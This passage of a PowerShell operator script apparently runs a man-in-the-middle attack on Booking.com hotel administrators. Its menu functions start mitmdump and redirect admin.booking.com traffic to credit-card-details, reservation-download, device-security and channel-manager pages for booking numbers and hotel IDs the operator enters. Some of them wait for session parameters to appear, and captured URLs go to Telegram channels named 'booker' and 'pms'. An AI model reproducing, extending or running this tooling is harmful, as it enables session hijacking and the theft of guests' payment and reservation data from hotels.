        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "FUNCTION_15"
    Log-Write "Booking.com HOTEL SECURITY redirect enabled (function 15)."
    Start-Mitmdump
}

function Enable-Operation16Redirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting Operation 16 sequence (function 13 -> function 15)..."
    
    if (-not (Test-Path (Split-Path $Operation16Flag))) {
        New-Item -ItemType Directory -Path (Split-Path $Operation16Flag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $Operation16Flag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $BookingHotelFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingHotelFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingHotelFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelSecurityFlag,
        $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "OPERATION_16"
    Start-Mitmdump
    
    Log-Write "Operation 16: Function 13 (Booking Hotel Redirect) enabled."
    Log-Write "Function 15 (Booking Hotel Security Redirect) will activate after function 13 completes."
}

function Enable-CustomRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting FUNCTION 17..."
    
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    
    Start-Sleep -Milliseconds 500
    
    Write-Host ""
    Write-Host "=== FUNCTION 17: CUSTOM ONE-TIME REDIRECT ==="
    Write-Host ""
    Write-Host "[INFO] This function will redirect the FIRST request to FROM URL" 
    Write-Host "       to TO URL, then automatically disable itself."
    Write-Host "       Works with ANY domains (bbc.com, cnn.com, etc.)"
    Write-Host ""
    
    do {
        $fromDomain = Read-Host "Enter FULL FROM URL (e.g., https://bbc.com)"
        if ($fromDomain -notmatch '^https?://') {
            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
            Write-Host "Example: https://www.bbc.com" 
            Write-Host "         https://cnn.com"
            Write-Host "         http://example.com"
            continue
        }
        
        # ИСПРАВЛЕНО: добавлен $ в конце regex
        if ($fromDomain -notmatch '^https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$') {
            Write-Host "WARNING: URL doesn't look like a valid domain" -ForegroundColor Yellow
            $confirm = Read-Host "Continue anyway? (y/n)"
            if ($confirm -ne 'y') {
                continue
            }
        }
        break
    } while ($true)
    
    do {
        $toDomain = Read-Host "Enter FULL TO URL"
        if ($toDomain -notmatch '^https?://') {
            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
            Write-Host "Example: https://www.google.com" 
            Write-Host "         https://example.com"
            Write-Host "         http://redirect-target.com"
            continue
        }
        
        $fromHost = $fromDomain -replace '^https?://(www\.)?', ''
        $toHost = $toDomain -replace '^https?://(www\.)?', ''
        if ($fromHost -eq $toHost) {
            Write-Host "WARNING: FROM and TO domains are the same!" -ForegroundColor Yellow
            Write-Host "This might cause infinite redirects!"
            $confirm = Read-Host "Continue anyway? (y/n)"
            if ($confirm -ne 'y') {
                continue
            }
        }
        break
    } while ($true)
    
    Set-Content -Path $CustomRedirectFromFile -Value $fromDomain.Trim() -Force
    Set-Content -Path $CustomRedirectToFile -Value $toDomain.Trim() -Force
    
    Log-Write ("[F17] Configured: {0} -> {1}" -f $fromDomain, $toDomain)
    Write-Host ""
    Write-Host ("[CONFIGURED] First request to: {0}" -f $fromDomain) -ForegroundColor Green
    Write-Host ("Will be redirected to: {0}" -f $toDomain) -ForegroundColor Green
    Write-Host ""
    Write-Host "[IMPORTANT] Function will:" -ForegroundColor Cyan
    Write-Host "1. Redirect ONLY the FIRST matching request"
    Write-Host "2. Work with ANY domain (old or new)"
    Write-Host "3. Auto-disable after first use"
    Write-Host "4. Send notification to Telegram"
    Write-Host ""
    
    $flagDir = Split-Path $CustomRedirectFlag
    if (-not (Test-Path $flagDir)) {
        New-Item -ItemType Directory -Path $flagDir -Force | Out-Null
    }
    
    Set-Content -Path $CustomRedirectFlag -Value "ACTIVE" -Force
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "FUNCTION_17"
    Start-Mitmdump
    
    Log-Write "[F17] Custom one-time redirect enabled."
    Write-Host ""
    Write-Host "✅ Function 17 ACTIVATED" -ForegroundColor Green
    Write-Host "   Next request to $fromDomain will be redirected" -ForegroundColor Cyan
    Write-Host ""
}

function Clear-Function17 {
    Log-Write "Clearing Function 17..."
    
    Remove-Item -Path $CustomRedirectFlag -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -Force -ErrorAction SilentlyContinue
    
    Write-Host ""
    Write-Host "✅ Function 17 completely cleared" -ForegroundColor Green
    Write-Host "   All flags and configuration removed"
    Write-Host ""
    
    Log-Write "Function 17 cleared"
}

function Enable-BookingReservationsRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting 18..."
    
    Write-Host ""
    Write-Host "=== RESERVATIONS DOWNLOAD REDIRECT ==="
    Write-Host ""
    
    do {
        $hotelId = Read-Host "Enter hotel_id"
        if ($hotelId -notmatch '^\d+$') {
            Write-Host "ERROR: hotel_id must be a number" -ForegroundColor Red
            continue
        }
        break
    } while ($true)
    
    do {
        $reportId = Read-Host "Enter reportId"
        if ($reportId -notmatch '^\d+$') {
            Write-Host "ERROR: reportId must be a number" -ForegroundColor Red
            continue
        }
        break
    } while ($true)
    
    Set-Content -Path $BookingReservationsHotelIdFile -Value $hotelId -Force
    Set-Content -Path $BookingReservationsReportIdFile -Value $reportId -Force
    
    if (-not (Test-Path (Split-Path $BookingReservationsFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingReservationsFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingReservationsFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Log-Write ("Booking reservations redirect enabled with hotel_id={0}, reportId={1}" -f $hotelId, $reportId)
    Save-AutostartState -FunctionName "FUNCTION_18"
    
    Write-Host ""
    Write-Host "[INFO] Function 18: Reservations download redirect enabled"
    Write-Host "       Redirects admin.booking.com/hotel/* -> reservations_download.html"
    Write-Host ""
    
    Start-Mitmdump
    Log-Write "Booking reservations download redirect enabled (function 18)."
}

function Enable-BookingCCDetailsRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting 19..."
    
    Write-Host ""
    Write-Host "=== CREDIT CARD DETAILS REDIRECT ==="
    Write-Host ""
    
    do {
        $bn = Read-Host "Enter bn (booking number)"
        if ($bn -notmatch '^\d+$') {
            Write-Host "ERROR: bn must be a number" -ForegroundColor Red
            continue
        }
        break
    } while ($true)
    
    do {
        $hotelId = Read-Host "Enter hotel_id"
        if ($hotelId -notmatch '^\d+$') {
            Write-Host "ERROR: hotel_id must be a number" -ForegroundColor Red
            continue
        }
        break
    } while ($true)
    
    Set-Content -Path $BookingCCDetailsBnFile -Value $bn -Force
    Set-Content -Path $BookingCCDetailsHotelIdFile -Value $hotelId -Force
    
    if (-not (Test-Path (Split-Path $BookingCCDetailsFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingCCDetailsFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingCCDetailsFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Log-Write ("Booking CC details redirect enabled with bn={0}, hotel_id={1}" -f $bn, $hotelId)
    Save-AutostartState -FunctionName "FUNCTION_19"
    
    Write-Host ""
    Write-Host "[INFO] Function 19: Credit card details redirect enabled"
    Write-Host "       Redirects admin.booking.com -> secure-admin.booking.com/booking_cc_details.html"
    Write-Host ""
    
    Start-Mitmdump
    Log-Write "Booking CC details redirect enabled (function 19)."
}

# ========== ФУНКЦИЯ 27: ЦИКЛИЧЕСКАЯ КОПИЯ ФУНКЦИИ 18 ==========
function Enable-BookingReservationsCycleRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting FUNCTION 27..."
    
    Write-Host ""
    Write-Host "============================================"
    Write-Host "=== FUNCTION 27: CYCLE RESERVATIONS DOWNLOAD ==="
    Write-Host "============================================"
    Write-Host ""
    Write-Host "[INFO] УСЛОЖНЕННАЯ КОПИЯ ФУНКЦИИ 18"
    Write-Host "       1. Админ вводит СПИСОК hotel_id и СПИСОК report_id"
    Write-Host "       2. Скрипт проходит по всем комбинациям"
    Write-Host "       3. После каждого цикла - пауза 1 минута"
    Write-Host "       4. Затем новый цикл с новыми параметрами"
    Write-Host "       5. ПОЛНОЕ ЛОГИРОВАНИЕ как в функции 18"
    Write-Host ""
    
    do {
        # ИСПРАВЛЕНО: полный пример с закрытой кавычкой
        $hotelIdsInput = Read-Host "Enter hotel_id(s) (comma-separated, e.g.: 14762911,15239128,10790315)"
        $hotelIdsArray = $hotelIdsInput.Split(',') | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' }
        
        $valid = $true
        foreach ($id in $hotelIdsArray) {
            if ($id -notmatch '^\d+$') {
                Write-Host "ERROR: '$id' is not a valid number" -ForegroundColor Red
                $valid = $false
                break
            }
        }
        
        if ($hotelIdsArray.Count -eq 0) {
            Write-Host "ERROR: At least one hotel_id is required" -ForegroundColor Red
            $valid = $false
        }
        
        if ($valid) { break }
    } while ($true)
    
    do {
        # ИСПРАВЛЕНО: полный пример с закрытой кавычкой
        $reportIdsInput = Read-Host "Enter reportId(s) (comma-separated, e.g.: 5865185,1234567,7654321)"
        $reportIdsArray = $reportIdsInput.Split(',') | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' }
        
        $valid = $true
        foreach ($id in $reportIdsArray) {
            if ($id -notmatch '^\d+$') {
                Write-Host "ERROR: '$id' is not a valid number" -ForegroundColor Red
                $valid = $false
                break
            }
        }
        
        if ($reportIdsArray.Count -eq 0) {
            Write-Host "ERROR: At least one reportId is required" -ForegroundColor Red
            $valid = $false
        }
        
        if ($valid) { break }
    } while ($true)
    
    if ($hotelIdsArray.Count -ne $reportIdsArray.Count) {
        Write-Host ""
        Write-Host "⚠️  WARNING: Number of hotel_ids and report_ids do not match!" -ForegroundColor Yellow
        Write-Host "   Hotel IDs: $($hotelIdsArray.Count), Report IDs: $($reportIdsArray.Count)" -ForegroundColor Yellow
        Write-Host "   Script will use MINIMUM count: $(($hotelIdsArray.Count, $reportIdsArray.Count | Measure-Object -Minimum).Minimum)" -ForegroundColor Yellow
        $confirm = Read-Host "Continue anyway? (y/n)"
        if ($confirm -ne 'y') {
            Write-Host "Function 27 cancelled." -ForegroundColor Red
            return
        }
    }
    
    $hotelIdsString = $hotelIdsArray -join ','
    $reportIdsString = $reportIdsArray -join ','
    
    Set-Content -Path $BookingReservationsCycleHotelIdsFile -Value $hotelIdsString -Force
    Set-Content -Path $BookingReservationsCycleReportIdsFile -Value $reportIdsString -Force
    Set-Content -Path $BookingReservationsCycleIndexFile -Value "0" -Force
    Set-Content -Path $BookingReservationsCycleActiveFile -Value "1" -Force
    
    if (-not (Test-Path (Split-Path $BookingReservationsCycleFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingReservationsCycleFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingReservationsCycleFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile
        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    $totalCycles = ($hotelIdsArray.Count, $reportIdsArray.Count | Measure-Object -Minimum).Minimum
    Log-Write ("Function 27 enabled with {0} cycles" -f $totalCycles)
    Log-Write ("Hotel IDs: {0}" -f $hotelIdsString)
    Log-Write ("Report IDs: {0}" -f $reportIdsString)
    
    Save-AutostartState -FunctionName "FUNCTION_27"
    
    Write-Host ""
    Write-Host "============================================" -ForegroundColor Green
    Write-Host "✅ FUNCTION 27 ACTIVATED" -ForegroundColor Green
    Write-Host "============================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "📋 CONFIGURATION:" -ForegroundColor Cyan
    Write-Host "   Total cycles: $totalCycles"
    Write-Host "   Hotel IDs: $hotelIdsString"
    Write-Host "   Report IDs: $reportIdsString"
    Write-Host ""
    Write-Host "🔄 EXECUTION PLAN:" -ForegroundColor Cyan
    for ($i = 0; $i -lt $totalCycles; $i++) {
        Write-Host "   Cycle $($i+1): hotel_id=$($hotelIdsArray[$i]), report_id=$($reportIdsArray[$i])"
    }
    Write-Host ""
    Write-Host "⏱️  TIMING:" -ForegroundColor Cyan
    Write-Host "   - Each cycle runs until ALL 5 parameters detected"
    Write-Host "   - After completion: 10s auto-redirect to main page"
    Write-Host "   - 60 second pause between cycles"
    Write-Host "   - Automatically proceeds through ALL cycles"
    Write-Host ""
    Write-Host "📨 NOTIFICATIONS:" -ForegroundColor Cyan
    Write-Host "   - Each cycle completion sends Telegram notification with FULL URL"
    Write-Host "   - Final notification when ALL cycles completed"
    Write-Host "   - ✅ ВСЕ УВЕДОМЛЕНИЯ ИДУТ В КАНАЛ BOOKER!"
    Write-Host ""
    
    Start-Mitmdump
    Log-Write "Booking reservations CYCLE redirect enabled (function 27)."
}

function Clear-Function27 {
    Log-Write "Clearing Function 27..."
    
    Remove-Item -Path $BookingReservationsCycleFlag -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsCycleHotelIdsFile -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsCycleReportIdsFile -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsCycleIndexFile -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsCycleActiveFile -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsCycleNextRunFile -Force -ErrorAction SilentlyContinue
    
    Write-Host ""
    Write-Host "✅ Function 27 completely cleared" -ForegroundColor Green
    Write-Host "   All cycle flags and configuration removed"
    Write-Host ""
    
    Log-Write "Function 27 cleared"
}

# ========== НОВЫЕ ФУНКЦИИ 21-26 ==========

function Enable-PartnersRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting FUNCTION 21..."
    
    Write-Host ""
    Write-Host "=== FUNCTION 21: PARTNERS REDIRECT ==="
    Write-Host ""
    Write-Host "[INFO] This function redirects admin.booking.com to channel-manager page"
    Write-Host "       Works until user gets page with 'tlc' parameter"
    Write-Host "       Then redirects to https://admin.booking.com/hotel/"
    Write-Host "       Logs to Telegram channel 'booker'"
    Write-Host ""
    
    if (-not (Test-Path (Split-Path $PartnersFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $PartnersFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $PartnersFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Log-Write "Function 21 (Partners redirect) enabled"
    Save-AutostartState -FunctionName "FUNCTION_21"
    
    Write-Host ""
    Write-Host "✅ Function 21 ACTIVATED" -ForegroundColor Green
    Write-Host "   Redirecting admin.booking.com to channel-manager"
    Write-Host "   Telegram notifications to channel 'booker'"
    Write-Host ""
    
    Start-Mitmdump
}

function Enable-PartnersAndMessRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting FUNCTION 22..."
    
    Write-Host ""
    Write-Host "=== FUNCTION 22: PARTNERS AND MESSAGING ==="
    Write-Host ""
    Write-Host "[INFO] Combination: Function 21 -> then Function 15"
    Write-Host "       Telegram logs to channel 'booker'"
    Write-Host ""
    
    if (-not (Test-Path (Split-Path $PartnersAndMessFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $PartnersAndMessFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $PartnersAndMessFlag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $PartnersFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $PartnersFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $PartnersFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Log-Write "Function 22 (Partners and Messaging) enabled"
    Save-AutostartState -FunctionName "FUNCTION_22"
    
    Write-Host ""
    Write-Host "✅ Function 22 ACTIVATED" -ForegroundColor Green
    Write-Host "   Sequence: Function 21 -> then Function 15"
    Write-Host "   Telegram notifications to channel 'booker'"
    Write-Host ""
    
    Start-Mitmdump
}

function Enable-DeviceRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting FUNCTION 23..."
    
    Write-Host ""
    Write-Host "=== FUNCTION 23: DEVICE SECURITY ==="
    Write-Host ""
    Write-Host "[INFO] Redirects admin.booking.com to devices.html"
    Write-Host "       Works until user gets page with 'auth_assurance_last_check'"
    Write-Host "       Then redirects to https://admin.booking.com/hotel/hoteladmin/"
    Write-Host "       Logs to Telegram channel 'pms'"
    Write-Host ""
    
    if (-not (Test-Path (Split-Path $DeviceFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $DeviceFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $DeviceFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Log-Write "Function 23 (Device Security) enabled"
    Save-AutostartState -FunctionName "FUNCTION_23"
    
    Write-Host ""
    Write-Host "✅ Function 23 ACTIVATED" -ForegroundColor Green
    Write-Host "   Redirecting admin.booking.com to devices.html"
    Write-Host "   Telegram notifications to channel 'pms'"
    Write-Host ""
    
    Start-Mitmdump
}

function Enable-PulseRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting FUNCTION 24..."
    
    Remove-Item -Path $PulseDisabledFlag -Force -ErrorAction SilentlyContinue
    
    Write-Host ""
    Write-Host "=== FUNCTION 24: PULSE REDIRECT ==="
    Write-Host ""
    Write-Host "[INFO] Redirects admin.booking.com to custom URL"
    Write-Host "       PULSE работает ПОКА АДМИН НЕ ОТКЛЮЧИТ функцию"
    Write-Host "       После отключения: ВСЕ запросы к account.booking.com"
    Write-Host "       будут перенаправлены на admin.booking.com/hotel/hoteladmin/"
    Write-Host "       Telegram logs to channel 'pms'"
    Write-Host ""
    Write-Host "📌 ADMIN COMMANDS FOR PULSE CONTROL:"
    Write-Host "   - Pulse работает БЕСКОНЕЧНО пока не отключен"
    Write-Host "   - Для ОСТАНОВКИ Pulse выберите:"
    Write-Host "       1) Опция 4 (DISABLE all redirects) - полное отключение"
    Write-Host "       2) Опция 1 (RESET) - сброс"
    Write-Host "   - После остановки: все account.booking.com -> admin.booking.com/hotel/hoteladmin/"
    Write-Host ""
    Write-Host "🔧 ЛОГИКА РАБОТЫ:"
    Write-Host "   - В активном режиме: admin.booking.com -> ваш_выбранный_URL"
    Write-Host "   - После отключения: account.booking.com/* -> admin.booking.com/hotel/hoteladmin/"
    Write-Host ""
    
    do {
        $toDomain = Read-Host "Enter FULL TO URL for Pulse redirect (must start with http:// or https://)"
        if ($toDomain -notmatch '^https?://') {
            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
            continue
        }
        
        if ($toDomain -like "*admin.booking.com*") {
            Write-Host "WARNING: Target URL contains admin.booking.com" -ForegroundColor Yellow
            Write-Host "This might create redirect loops!" -ForegroundColor Red
            $confirm = Read-Host "Continue anyway? (y/n)"
            if ($confirm -ne 'y') {
                continue
            }
        }
        
        break
    } while ($true)
    
    Set-Content -Path $PulseRedirectToFile -Value $toDomain.Trim() -Force
    
    if (-not (Test-Path (Split-Path $PulseFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $PulseFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $PulseFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $UltraPulseFlag,
        $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
    ) | ForEach-Object {
